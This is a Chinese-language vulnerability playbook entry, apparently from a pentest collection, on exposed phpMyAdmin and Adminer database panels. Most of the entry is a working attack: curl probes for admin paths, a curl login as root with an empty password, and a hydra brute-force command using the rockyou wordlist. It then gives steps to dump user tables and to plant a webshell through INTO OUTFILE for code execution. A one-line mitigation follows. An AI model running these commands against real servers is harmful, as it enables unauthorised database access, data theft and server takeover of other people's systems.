---
title: phpMyAdmin / Adminer 暴露（弱口令直进数据库）
cve: 无（配置缺陷）
severity: critical
cvss: 9.0
product: phpMyAdmin / Adminer / 宝塔 pma
versions: 任意
ports: 80, 443, 888, 8080
keywords: phpmyadmin, adminer, pma, 数据库, 弱口令, 脱库
entry: /phpmyadmin/  /pma/  /adminer.php
verified: false
sources: 公开资料整理（配置缺陷类）
---

## 指纹

```
GET /phpmyadmin/       → 200 登录页
GET /adminer.php       → 200 单文件
GET /pma/              → 宝塔自带 pma
```

## 前置条件

- 管理工具暴露在公网。

## PoC

```bash
# 1) 探路径
for p in /phpmyadmin/ /pma/ /adminer.php /db/ /mysql/; do
  echo "$p $(curl -s -o /dev/null -w '%{http_code}' "https://target$p")"
done

# 2) root 空口令（宝塔 pma 常见）
curl -s 'https://target/pma/index.php' -d 'pma_username=root&pma_password=&server=1' -o /tmp/pma.html
grep -qi 'logout\|服务器' /tmp/pma.html && echo "空口令进入"

# 3) 弱口令
hydra -l root -P /usr/share/wordlists/rockyou.txt target http-post-form \
  '/phpmyadmin/index.php:pma_username=^USER^&pma_password=^PASS^&server=1:F=无法登录'
```

## 利用步骤

1. 先探路径（只读）；
2. 空口令 → 弱口令 → 宝塔 pma（宝塔默认 root 同面板账号）；
3. 进库先看 `user/admin/member` 表结构，导出少量证明；
4. 需要 RCE 时用 `INTO OUTFILE` 写马（确认 secure_file_priv 与 web 目录）；
5. 证据：登录成功页 + 表结构截图（脱敏）。

## 修复与缓解

- pma/adminer 只允许内网；root 禁远程；数据库账号最小权限。

## 参考

- phpMyAdmin 安全建议。
